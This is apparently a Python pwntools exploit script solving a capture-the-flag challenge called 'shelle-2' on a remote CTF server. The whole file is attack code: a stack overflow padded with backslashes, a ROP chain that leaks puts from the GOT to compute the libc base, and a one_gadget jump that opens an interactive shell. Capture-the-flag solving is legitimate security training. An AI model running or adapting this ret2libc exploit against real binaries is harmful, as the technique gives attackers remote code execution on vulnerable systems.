from pwn import *

#r = process("./shelle-2")
r = remote("challenge.ctf.games", 32374)
#gdb.attach(r)


r.recvuntil(b"psuedoshell$")


puts_func = 0x4010f0
main_func = 0x40156c
pop_rdi_ret = 0x00000000004015f3
puts_got = 0x0000000000403fb0
pop5_ret = 0x00000000004015eb
pop2_ret = 0x0000000000401569

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
puts_off = 0x00000000000875a0

payload = chr(92).encode("utf-8")*(466+15)
payload += p64(pop5_ret) + p64(0)*5 
payload += p64(pop5_ret) + p64(0)*5
payload += p64(pop2_ret) + p64(0)*2
payload += p64(pop_rdi_ret) + p64(puts_got)
payload += p64(puts_func) + p64(main_func)
payload += chr(92).encode("utf-8")*20

r.sendline(payload)

r.recvuntil(b"psuedoshell$")
r.sendline("exit")

sstuff = r.recvuntil("psuedoshell$").split(b"Welcome")[0].split(b"\n")[0]
sstuff = int.from_bytes(sstuff, "little")

libc_base = sstuff - puts_off
onegadget_off = 0xe6c81
onegadget_addr = libc_base + onegadget_off


payload = chr(92).encode("utf-8")*(466+15)
payload += p64(onegadget_addr)
r.sendline(payload)

r.recvuntil(b"psuedoshell$")
r.sendline(b"exit")

r.interactive()

#print(hex(libc_base))